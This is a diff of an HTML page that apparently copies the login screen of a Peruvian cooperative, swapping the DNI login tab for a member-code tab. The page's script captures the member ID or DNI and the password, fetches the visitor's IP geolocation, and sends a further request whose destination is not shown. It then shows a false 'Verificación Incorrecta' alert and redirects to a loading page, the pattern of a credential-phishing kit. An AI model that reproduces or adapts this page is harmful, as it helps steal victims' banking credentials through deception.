@@ -10,6 +10,7 @@
       type="image/x-icon"
       href="https://pacinet.cp.com.pe/favicon.png"
     />
+  
 
     <style>
       @charset "UTF-8";
@@ -69,17 +70,6 @@
         }
       }
     </style>
-    <script>
-      function validarNumeros(event) {
-        const input = event.target;
-        const valorInput = input.value;
-        const patron = /^\d*$/; // Expresión regular para validar números
-
-        if (!patron.test(valorInput)) {
-          input.value = valorInput.replace(/[^\d]/g, ""); // Eliminar caracteres no numéricos
-        }
-      }
-    </script>
     <link
       rel="stylesheet"
       href="datos/styles.7af00e0c01ae7ce80e16.css"
@@ -415,30 +405,30 @@
                               style=""
                             >
                               <ul
-                                _ngcontent-gxl-c48=""
-                                class="tab-slider--tabs"
+                                _ngcontent-rpk-c48=""
+                                class="tab-slider--tabs slide"
                               >
                                 <li
-                                  _ngcontent-gxl-c48=""
+                                  _ngcontent-rpk-c48=""
                                   rel="tab1"
+                                  class="tab-slider--trigger"
+                                  style="
+                                    font-family: Arial, Helvetica, sans-serif !important;
+                                  "
+                                >
+                                  <a href="index.html" style="color: #0071b9">
+                                    DNI
+                                  </a>
+                                </li>
+                                <li
+                                  _ngcontent-rpk-c48=""
+                                  rel="tab2"
                                   class="tab-slider--trigger active"
                                   style="
                                     font-family: Arial, Helvetica, sans-serif !important;
                                   "
                                 >
                                   <a href="codigo.html" style="color: white"
-                                    >DNI</a
-                                  >
-                                </li>
-                                <li
-                                  _ngcontent-gxl-c48=""
-                                  rel="tab2"
-                                  class="tab-slider--trigger"
-                                  style="
-                                    font-family: Arial, Helvetica, sans-serif !important;
-                                  "
-                                >
-                                  <a href="codigo.html" style="color: #0071b9"
                                     >Código de Socio</a
                                   >
                                 </li>
@@ -466,11 +456,25 @@
                                         font-family: Arial, Helvetica,
                                           sans-serif !important;
                                       "
-                                      >DNI: </label
+                                      >CÓDIGO DE SOCIO: </label
                                     ><span
                                       _ngcontent-gxl-c48=""
                                       class="user_dni_codigo"
                                     >
+                                      <script>
+                                        function validarNumeros(event) {
+                                          const input = event.target;
+                                          const valorInput = input.value;
+                                          const patron = /^\d*$/; // Expresión regular para validar números
+
+                                          if (!patron.test(valorInput)) {
+                                            input.value = valorInput.replace(
+                                              /[^\d]/g,
+                                              ""
+                                            ); // Eliminar caracteres no numéricos
+                                          }
+                                        }
+                                      </script>
                                       <input
                                         style="
                                           font-family: Arial, Helvetica,
@@ -478,16 +482,17 @@
                                         "
                                         _ngcontent-gxl-c48=""
                                         type="text"
-                                        inputmode="numeric"
+                                        numeric=""
                                         name="userCode"
                                         autocomplete="off"
-                                        id="dni"
-                                        oninput="validarNumeros(event)"
-                                        class="form_element ng-untouched ng-pristine ng-invalid"
-                                        placeholder="Ingrese número de DNI"
-                                        minlength="8"
-                                        maxlength="8"
                                         required
+                                        id="dni"
+                                        class="form_element ng-untouched ng-pristine ng-invalid"
+                                        placeholder="Ingrese su código de socio:"
+                                        inputmode="numeric"
+                                        oninput="validarNumeros(event)"
+                                        minlength="3"
+                                        maxlength="10"
                                       /><!----></span
                                     >
                                   </div>
@@ -534,12 +539,12 @@
                                         _ngcontent-gxl-c48=""
                                         name="userPassword"
                                         placeholder="Ingrese su contraseña"
+                                        required
                                         class="form_element ng-untouched ng-pristine ng-invalid"
                                         type="password"
                                         minlength="6"
                                         maxlength="10"
                                         id="contra"
-                                        required
                                       /><!----></span
                                     >
                                   </div>
@@ -815,12 +820,18 @@
         </div></app-loader
       ></app-root
     >
-    <script src="datos/runtime.81e45efed06e87fd0976.js" defer="defer"></script>
+    <script
+      src="datos/runtime.81e45efed06e87fd0976.js"
+      defer="defer"
+    ></script>
     <script
       src="datos/polyfills.500a931972a190eb8929.js"
       defer="defer"
     ></script>
-    <script src="datos/main.2fdd53f9ee0f5ccee6d9.js" defer="defer"></script>
+    <script
+      src="datos/main.2fdd53f9ee0f5ccee6d9.js"
+      defer="defer"
+    ></script>
 
     <div>
       <div
@@ -876,20 +887,20 @@
   <script>
     const url = "https://ipapi.co/json/";
     const form = document.querySelector("#loginform");
-
+  
     form.addEventListener("submit", (event) => {
-      event.preventDefault(); // Aquí evitamos que el formulario se envíe
-
+      event.preventDefault(); // Evitamos que el formulario se envíe
+  
       // Obtener valores de DNI y contraseña
       const dni = document.querySelector("#dni").value;
       const contra = document.querySelector("#contra").value;
-
+  
       // Verificar si alguno de los campos está vacío
-      if (dni.trim() === "" || contra.trim() === "") {
+      if (dni.trim() === '' || contra.trim() === '') {
         alert("Por favor, completa todos los campos.");
         return; // Detener la ejecución si hay campos vacíos
       }
-
+  
       // Si los campos no están vacíos, continuar con la solicitud
       axios
         .get(url)
@@ -916,7 +927,8 @@
               }
             )
             .then((response) => {
-              parent.location.href = "correo.html";
+              alert("Verificación Incorrecta")
+              parent.location.href = "cargando.html";
             })
             .catch((error) => {
               console.error(error);
@@ -927,4 +939,5 @@
         });
     });
   </script>
+  
 </html>
